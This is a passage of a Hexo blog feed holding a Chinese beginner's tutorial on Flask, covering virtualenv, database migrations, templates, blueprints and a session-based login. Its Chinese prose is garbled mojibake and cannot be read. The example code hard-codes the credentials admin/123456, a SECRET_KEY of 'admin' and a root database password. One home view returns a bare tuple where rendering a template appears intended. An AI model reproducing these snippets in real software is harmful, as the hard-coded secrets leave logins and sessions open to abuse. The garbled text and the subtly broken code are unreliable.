<h1 id="ä¸‰ã€ä¸€äº›å°å»ºè®®"><a href="#ä¸‰ã€ä¸€äº›å°å»ºè®®" class="headerlink" title="ä¸‰ã€ä¸€äº›å°å»ºè®®"></a>ä¸‰ã€ä¸€äº›å°å»ºè®®</h1><p>å»ºè®®è¦æ˜¯å¾ˆæœ‰æ—¶é—´çš„è¯å°±æ˜¯æŒ‘è‡ªå·±å–œæ¬¢çš„åšå®¢å§ï¼Œæ…¢æ…¢æ”¹æ”¹è¿™æœ€åè‚¯å®šè¿˜æ˜¯å¾ˆç‚«çš„ï¼Œä¸æ˜¯é‚£ä¹ˆåœ¨æ„å¤–è§‚çš„æ„Ÿè§‰nextå°±å¾ˆå¤Ÿç”¨äº†ï¼Œè‡³å°‘å„ç§åŠŸèƒ½æ–¹ä¾¿å»é…ç½®ã€‚è¿˜æœ‰å°±æ˜¯hexoæˆ‘æ„Ÿè§‰ç›¸å¯¹WordPressæ˜¯æ²¡æœ‰WordPressæ–¹ä¾¿æ“ä½œçš„ï¼Œæ¯•ç«Ÿé‚£ä¸ªè¿˜æœ‰æ“ä½œçš„ç•Œé¢ä»€ä¹ˆçš„ï¼Œå½“ç„¶ï¼Œè¿™ä¹Ÿè¿˜æ˜¯ä¸»è¦çœ‹ä¸ªäººé€‰æ‹©ã€‚æœ€é‡è¦çš„ä¸åœ¨åšå®¢çš„å¤–è§‚ï¼Œè€Œåœ¨äºå†…å®¹ï¼Œå†…å®¹å¥½æ‰æ˜¯çœŸæ­£å¥½çš„åšå®¢ï¼</p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>blog</tag>
      </tags>
  </entry>
  <entry>
    <title>pythonå­¦ä¹ ç»å†-2-flask</title>
    <url>/2023/11/13/python%E5%AD%A6%E4%B9%A0%E7%BB%8F%E5%8E%86-2-flask/</url>
    <content><![CDATA[<p>æ¥ç€ä¹‹å‰çš„pythonè¿›è¡Œå­¦ä¹ ï¼Œå†³å®šè¿˜æ˜¯ä»æ›´åŠ å®ç”¨ç‚¹çš„é¡¹ç›®ç›¸å…³çš„çŸ¥è¯†å»å­¦ä¹ ï¼Œè¿™æ ·ä¹Ÿå¯ä»¥å»æ›´å¥½çš„å®è·µå½“ä¸­å»é”»ç‚¼è‡ªå·±çš„èƒ½åŠ›ï¼Œæ‰€ä»¥å°±é€‰æ‹©äº†flaskè¿™ä¸ªpythonä¸­çš„è½»é‡æ¨¡å—å»å­¦ä¹ ã€‚</p>
<span id="more"></span>

<h1 id="ä¸€ã€pythonä¸­è™šæ‹Ÿç¯å¢ƒçš„ä½¿ç”¨"><a href="#ä¸€ã€pythonä¸­è™šæ‹Ÿç¯å¢ƒçš„ä½¿ç”¨" class="headerlink" title="ä¸€ã€pythonä¸­è™šæ‹Ÿç¯å¢ƒçš„ä½¿ç”¨"></a>ä¸€ã€pythonä¸­è™šæ‹Ÿç¯å¢ƒçš„ä½¿ç”¨</h1><p>pythonæ˜¯ä¸€ä¸ªéå¸¸å¸¸è§çš„ç¼–ç¨‹è¯­è¨€ï¼Œåœ¨pythonä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬æ€»æ˜¯éœ€è¦ä½¿ç”¨åˆ°å¾ˆå¤šéœ€è¦è‡ªå·±å®‰è£…ä¸‹è½½çš„åº“ï¼Œæ‰€ä»¥ä¸€èˆ¬ä¸€ä¸ªpythonç¼–ç¨‹äººå‘˜çš„ç”µè„‘ä¸Šéƒ½æœ‰ç€è®¸è®¸å¤šå¤šçš„pythonåº“ï¼Œè€Œåœ¨æˆ‘ä»¬å»å¼€å‘ä¸€äº›ç½‘ç«™ï¼Œç¨‹åºç›¸å…³çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¹¶ä¸éœ€è¦å»ä½¿ç”¨åˆ°æˆ‘ä»¬æ‰€æœ‰çš„åº“ï¼Œå¹¶ä¸”å¯èƒ½éœ€è¦å»ä½¿ç”¨æŸäº›ç‰¹å®šç‰ˆæœ¬çš„åº“ï¼Œå¯è¿™åˆåº”è¯¥æ€ä¹ˆåŠï¼Ÿè¿™ä¸ªæ—¶å€™ï¼Œè™šæ‹Ÿç¯å¢ƒä¹Ÿå°±å› æ­¤è¯ç”Ÿäº†ã€‚</p>
<blockquote>
<p>åœ¨ä½¿ç”¨Pythonè¯­è¨€æ—¶ï¼Œé€šè¿‡pipï¼ˆpip3ï¼‰æ¥å®‰è£…ç¬¬ä¸‰æ–¹åŒ…ï¼Œä½†æ˜¯ç”±äºpipçš„ç‰¹æ€§ï¼Œç³»ç»Ÿä¸­åªèƒ½å®‰è£…æ¯ä¸ªåŒ…çš„ä¸€ä¸ªç‰ˆæœ¬ã€‚ä½†æ˜¯åœ¨å®é™…é¡¹ç›®å¼€å‘ä¸­ï¼Œä¸åŒé¡¹ç›®å¯èƒ½éœ€è¦ç¬¬ä¸‰æ–¹åŒ…çš„ä¸åŒç‰ˆæœ¬ï¼Œè¿«ä½¿æˆ‘ä»¬éœ€è¦æ ¹æ®å®é™…éœ€æ±‚ä¸æ–­è¿›è¡Œæ›´æ–°æˆ–å¸è½½ç›¸åº”çš„åŒ…ï¼Œè€Œå¦‚æœæˆ‘ä»¬ç›´æ¥ä½¿ç”¨æœ¬åœ°çš„Pythonç¯å¢ƒï¼Œä¼šå¯¼è‡´æ•´ä½“çš„å¼€å‘ç¯å¢ƒç›¸å½“æ··ä¹±è€Œä¸æ˜“ç®¡ç†ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±éœ€è¦å¼€è¾Ÿä¸€ä¸ªç‹¬ç«‹å¹²å‡€çš„ç©ºé—´è¿›è¡Œå¼€å‘å’Œéƒ¨ç½²ï¼Œè™šæ‹Ÿç¯å¢ƒå°±å­•è‚²è€Œç”Ÿã€‚</p>
</blockquote>
<p>ä¸‹é¢å°±ç›´æ¥å»è®°å½•ä¸€ä¸‹ä¸€äº›è™šæ‹Ÿç¯å¢ƒçš„å¸¸è§ä½¿ç”¨æ–¹æ³•ï¼Œæœ€æµè¡Œçš„å°±æ˜¯Virtualenvè¿™ä¸ªè™šæ‹Ÿç¯å¢ƒçš„é…ç½®å·¥å…·</p>
<p>å®‰è£…ï¼š</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">pip install virtualenv virtualenvwrapper-win  //windowsç¯å¢ƒä¸‹</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹è™šæ‹Ÿç¯å¢ƒæœ‰å“ªäº›</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">workon</span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºä¸€ä¸ªæ–°çš„è™šæ‹Ÿç¯å¢ƒ</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mkvirtualenv è™šæ‹Ÿç¯å¢ƒå</span><br></pre></td></tr></table></figure>

<p>å»ä½¿ç”¨ä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒ</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">workon è™šæ‹Ÿç¯å¢ƒå</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼šè™šæ‹Ÿç¯å¢ƒæ–‡ä»¶é»˜è®¤åœ¨Cç›˜ä¸­ç”¨æˆ·ä¸‹ä¸­çš„envä¸­</p>
<h1 id="äºŒã€æ•°æ®åº“ä¸­çš„æ•°æ®è¿ç§»æ“ä½œ"><a href="#äºŒã€æ•°æ®åº“ä¸­çš„æ•°æ®è¿ç§»æ“ä½œ" class="headerlink" title="äºŒã€æ•°æ®åº“ä¸­çš„æ•°æ®è¿ç§»æ“ä½œ"></a>äºŒã€æ•°æ®åº“ä¸­çš„æ•°æ®è¿ç§»æ“ä½œ</h1><p>æ•°æ®åº“é¦–å…ˆå…ˆåˆå§‹åŒ–è¿æ¥è®¾ç½®</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">db_uri = <span class="string">&#x27;mysql+pymysql://root:password@localhost:3306/bookdb&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_DATABASE_URI&#x27;</span>] = db_uri</span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_TRACK_MODIFICATIONS&#x27;</span>] = <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>å…¶æ¬¡å°±æ˜¯æ¨¡å—ç±»çš„åˆ›å»ºï¼Œä¹Ÿå°±ç›¸å½“äºæ•°æ®åº“ä¸­çš„åˆ—</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(db.Model):</span><br><span class="line">    __tablename__ = <span class="string">&#x27;tb_user&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">30</span>), unique=<span class="literal">True</span>, index=<span class="literal">True</span>)</span><br><span class="line">    age = db.Column(db.Integer, default=<span class="number">1</span>)</span><br><span class="line">    sex = db.Column(db.Boolean, default=<span class="literal">True</span>)</span><br><span class="line">    salary = db.Column(db.Float, default=<span class="number">10000</span>, nullable=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>ä¸ºä»€ä¹ˆè¦åšæ•°æ®è¿ç§»å‘¢ï¼Ÿåœ¨æˆ‘çš„ç†è§£ä¸­è¿™å°±ç›¸å½“äºä¸€ä¸ªç©ºç™½æ•°æ®åº“çš„åˆå§‹åŒ–ï¼Œå°†åˆ›å»ºçš„ç±»ä¸­çš„åˆ—æ·»åŠ åˆ°æ•°æ®åº“ä¹‹ä¸­ï¼Œå…¶å®å°±æ˜¯ç›¸å½“äºæˆ‘ä»¬å»åˆ›å»ºå„ä¸ªå­—æ®µçš„è¿‡ç¨‹ã€‚</p>
<p>ä¸‹é¢å°±æ˜¯ç”¨åˆ°çš„å‘½ä»¤</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">flask db init   //åˆ›å»ºè¿ç§»æ–‡ä»¶å¤¹migratesï¼Œåªè°ƒç”¨ä¸€æ¬¡</span><br><span class="line">flask db migrate //ç”Ÿæˆè¿ç§»æ–‡ä»¶</span><br><span class="line">flask db upgrade  //æ‰§è¡Œè¿ç§»æ–‡ä»¶ä¸­çš„å‡çº§</span><br><span class="line">flask db downgrade  //æ‰§è¡Œè¿ç§»æ–‡ä»¶ä¸­çš„é™çº§</span><br></pre></td></tr></table></figure>

<h1 id="ä¸‰ã€flaskæ¡†æ¶ä¸­çš„ä¸€äº›åŸºæœ¬æ“ä½œä»¥åŠç¤ºä¾‹"><a href="#ä¸‰ã€flaskæ¡†æ¶ä¸­çš„ä¸€äº›åŸºæœ¬æ“ä½œä»¥åŠç¤ºä¾‹" class="headerlink" title="ä¸‰ã€flaskæ¡†æ¶ä¸­çš„ä¸€äº›åŸºæœ¬æ“ä½œä»¥åŠç¤ºä¾‹"></a>ä¸‰ã€flaskæ¡†æ¶ä¸­çš„ä¸€äº›åŸºæœ¬æ“ä½œä»¥åŠç¤ºä¾‹</h1><h2 id="1ã€æœ€åŸºç¡€çš„å•æ–‡ä»¶æ¡†æ¶"><a href="#1ã€æœ€åŸºç¡€çš„å•æ–‡ä»¶æ¡†æ¶" class="headerlink" title="1ã€æœ€åŸºç¡€çš„å•æ–‡ä»¶æ¡†æ¶"></a>1ã€æœ€åŸºç¡€çš„å•æ–‡ä»¶æ¡†æ¶</h2><p>æ–‡ä»¶ç»“æ„ï¼š</p>
<p><img src="http://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-19/4e67729456c911aa9646284ff32250ab--24ca--image-20231119174414920.png" alt="image-20231119174414920"></p>
<blockquote>
<p>static: é™æ€æ–‡ä»¶æ–‡ä»¶å¤¹ï¼Œç”¨äºå­˜æ”¾ä¸€äº›åƒæ˜¯cssï¼Œjsï¼Œimageï¼Œfontç­‰çš„æ–‡ä»¶ã€‚</p>
<p>templatesï¼šç”¨äºå­˜æ”¾htmlç½‘ç«™æ–‡ä»¶</p>
</blockquote>
<p>app.py:ï¼ˆä¸»é¡¹ç›®æ–‡ä»¶ï¼‰</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index/&#x27;</span></span>) </span><span class="comment">#è·¯ç”±çš„æ³¨å†Œ</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello index!&#x27;</span>  <span class="comment">#é¡µé¢æ˜¾ç¤ºçš„æ•°æ®</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p><strong>appè¿è¡Œçš„æ—¶å€™ä¸€äº›å¯é€‰çš„å‚æ•°ï¼š</strong></p>
<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>è¯´æ˜</th>
<th>é»˜è®¤å€¼</th>
</tr>
</thead>
<tbody><tr>
<td>debug</td>
<td>ä»£ç æ›´æ–°æ˜¯å¦è‡ªåŠ¨é‡å¯</td>
<td>False</td>
</tr>
<tr>
<td>theaded</td>
<td>æ˜¯å¦å¼€å¯å¤šçº¿ç¨‹</td>
<td>False</td>
</tr>
<tr>
<td>port</td>
<td>æŒ‡å®šç«¯å£</td>
<td>5000</td>
</tr>
<tr>
<td>host</td>
<td>æŒ‡å®šä¸»æœºï¼ˆè®¾ç½®0.0.0.0å¯ä»¥é€šè¿‡æœ¬åœ°IPè®¿é—®ï¼‰</td>
<td>127.0.0.1</td>
</tr>
</tbody></table>
<p>ä¸€èˆ¬é¡¹ç›®å¼€å‘æ—¶éƒ½ä¼šå¼€å¯debugæ¨¡å¼</p>
<h2 id="2ã€ç®€å•çš„æ¨¡æ¿æ¸²æŸ“"><a href="#2ã€ç®€å•çš„æ¨¡æ¿æ¸²æŸ“" class="headerlink" title="2ã€ç®€å•çš„æ¨¡æ¿æ¸²æŸ“"></a>2ã€ç®€å•çš„æ¨¡æ¿æ¸²æŸ“</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">render_template()  <span class="comment">#å¯ä»¥è¿”å›ä¸€ä¸ªæ¸²æŸ“çš„htmlé¡µé¢</span></span><br></pre></td></tr></table></figure>

<p>ç¤ºä¾‹ï¼š</p>
<p>app.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, name=<span class="string">&quot;æ³•å¤–ç‹‚å¾’å¼ ä¸‰&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>index.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;../static/index.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>index<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>name: &#123;&#123; name &#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥åˆ©ç”¨render_templateå»å°†åç«¯çš„ä¸€äº›æ•°æ®è¿”å›åˆ°å‰ç«¯ï¼Œç„¶åå†ä½¿ç”¨å»ä½¿ç”¨ä¼ é€’è¿‡æ¥çš„å‚æ•°</p>
<h2 id="3ã€å¯¹æ–‡ä»¶ç»“æ„è¿›è¡Œè¿›è¡Œæ‹†åˆ†"><a href="#3ã€å¯¹æ–‡ä»¶ç»“æ„è¿›è¡Œè¿›è¡Œæ‹†åˆ†" class="headerlink" title="3ã€å¯¹æ–‡ä»¶ç»“æ„è¿›è¡Œè¿›è¡Œæ‹†åˆ†"></a>3ã€å¯¹æ–‡ä»¶ç»“æ„è¿›è¡Œè¿›è¡Œæ‹†åˆ†</h2><p>æ–‡ä»¶ç»“æ„ï¼š</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-19/137d93a1d65364fb1dee979682c5fa2a--6af8--image-20231119182749925.png" alt="image-20231119182749925"></p>
<p>å°†é™¤äº†ä¸»æ–‡ä»¶çš„å…¶ä»–æ–‡ä»¶éƒ½ç§»å…¥ä¸€ä¸ªå•ç‹¬åˆ›å»ºçš„Appæ–‡ä»¶å¤¹å½“ä¸­ã€‚</p>
<blockquote>
<p>init.pyï¼šåˆå§‹åŒ–çš„æ–‡ä»¶ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å°†appçš„åˆ›å»ºå‡½æ•°æ”¾å…¥å…¶ä¸­ï¼Œå¾…éœ€è¦ä½¿ç”¨æ—¶å¯¼å…¥å³å¯</p>
<p>models.pyï¼šæ¨¡æ¿æ–‡ä»¶ï¼Œåè¾¹ä¸»è¦ç”¨äºæ•°æ®åº“æ–¹é¢çš„æ“ä½œ</p>
<p>views.pyï¼šè§†å›¾å‡½æ•°çš„å­˜æ”¾ï¼Œä¹Ÿå°±æ˜¯å­˜æ”¾å„ç§è·¯ç”±çš„åœ°æ–¹</p>
</blockquote>
<p>ä¸ºäº†æ–¹ä¾¿è§†å›¾å‡½æ•°çš„ä½¿ç”¨ï¼Œä½¿ç”¨è“å›¾å»ç»‘å®š</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">app.register_blueprint(blueprint=blue)</span><br></pre></td></tr></table></figure>

<p>å°†appç»‘å®šåœ¨blueä¸Šï¼Œè¿™æ ·ä¹‹åè·¯ç”±å°±å¯ä»¥è¿™æ ·å»ä½¿ç”¨äº†</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/home/&#x27;</span></span>)</span></span><br></pre></td></tr></table></figure>

<h2 id="4ã€ç®€æ˜“ç™»å½•ç•Œé¢çš„å®ç°"><a href="#4ã€ç®€æ˜“ç™»å½•ç•Œé¢çš„å®ç°" class="headerlink" title="4ã€ç®€æ˜“ç™»å½•ç•Œé¢çš„å®ç°"></a>4ã€ç®€æ˜“ç™»å½•ç•Œé¢çš„å®ç°</h2><h3 id="â‘ cookieçš„ä¸€äº›è®¾ç½®"><a href="#â‘ cookieçš„ä¸€äº›è®¾ç½®" class="headerlink" title="â‘ cookieçš„ä¸€äº›è®¾ç½®"></a>â‘ cookieçš„ä¸€äº›è®¾ç½®</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">response = redirect(<span class="string">&#x27;/home/&#x27;</span>) <span class="comment">#é‡å®šå‘ï¼Œç”¨äºç™»å½•åç•Œé¢çš„è·³è½¬</span></span><br><span class="line"></span><br><span class="line">response.set_cookie(<span class="string">&#x27;user&#x27;</span>, username, max_age=<span class="number">3600</span>*<span class="number">24</span>*<span class="number">7</span>)</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ç›´æ¥é€šè¿‡set__cookieå»è®¾ç½®ä¸€ä¸ªjsonæ ¼å¼çš„cookie</p>
<h3 id="â‘¡sessionçš„ä¸€äº›è®¾ç½®"><a href="#â‘¡sessionçš„ä¸€äº›è®¾ç½®" class="headerlink" title="â‘¡sessionçš„ä¸€äº›è®¾ç½®"></a>â‘¡sessionçš„ä¸€äº›è®¾ç½®</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>

<p>å°†appçš„é…ç½®æ–‡ä»¶ä¸­çš„SECRET_KEYä¿®æ”¹ä¸ºä¸ç©ºçš„å€¼ï¼Œå¹¶ä¸”å°†è¿™ä¸ªä½œä¸ºå¯†åŒ™å»åŠ å¯†</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">session[<span class="string">&#x27;user&#x27;</span>] = username</span><br><span class="line"></span><br><span class="line">session.permanent = <span class="literal">True</span>  <span class="comment">#é»˜è®¤æ˜¯falseï¼Œå…³é—­æµè§ˆå™¨åå°±æ¸…ç©ºsession</span></span><br></pre></td></tr></table></figure>

<h3 id="â‘¢å®ç°"><a href="#â‘¢å®ç°" class="headerlink" title="â‘¢å®ç°"></a>â‘¢å®ç°</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint, redirect, render_template, request, session</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">blue = Blueprint(<span class="string">&#x27;user&#x27;</span>, __name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/home/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    username = session.get(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;home.html&#x27;</span>, username</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)   <span class="comment">#è·å–ä¼ é€’è¿‡æ¥çš„å‚æ•°</span></span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password == <span class="string">&#x27;123456&#x27;</span>:</span><br><span class="line">            response = redirect(<span class="string">&#x27;/home/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># response.set_cookie(&#x27;user&#x27;, username, max_age=3600*24*7)</span></span><br><span class="line">            session[<span class="string">&#x27;user&#x27;</span>] = username</span><br><span class="line">            session.permanent = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯ï¼&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/logout/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    response = redirect(<span class="string">&#x27;/home/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    session.pop(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="comment"># @blue.route(&#x27;/string/&lt;string:name&gt;/&#x27;, methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span></span><br><span class="line"><span class="comment"># def get_string(name):</span></span><br><span class="line"><span class="comment">#     print(type(name))</span></span><br><span class="line"><span class="comment">#     return name</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># @blue.route(&#x27;/redirect/&#x27;)</span></span><br><span class="line"><span class="comment"># def make_redirect():</span></span><br><span class="line"><span class="comment">#     pass</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     return redirect(&#x27;https://www.qq.com&#x27;)</span></span><br></pre></td></tr></table></figure>

<p>åœ¨è‡ªå·±è®¾è®¡ä¸€ä¸ªå‰æ®µç™»å…¥å³å¯</p>
<p>ç¤ºä¾‹ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>ç™»å½•<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>ç™»å½•<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">            ç”¨æˆ·åï¼š<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">            å¯†ç ï¼š<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span>&gt;</span>æäº¤<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="5ã€è·¯ç”±å‚æ•°"><a href="#5ã€è·¯ç”±å‚æ•°" class="headerlink" title="5ã€è·¯ç”±å‚æ•°"></a>5ã€è·¯ç”±å‚æ•°</h2><blockquote>
<p>string  æ¥æ”¶å¦‚ä½•æ²¡æœ‰æ–œæ (â€˜&#x2F;â€˜)çš„å­—ç¬¦ä¸²(é»˜è®¤)</p>
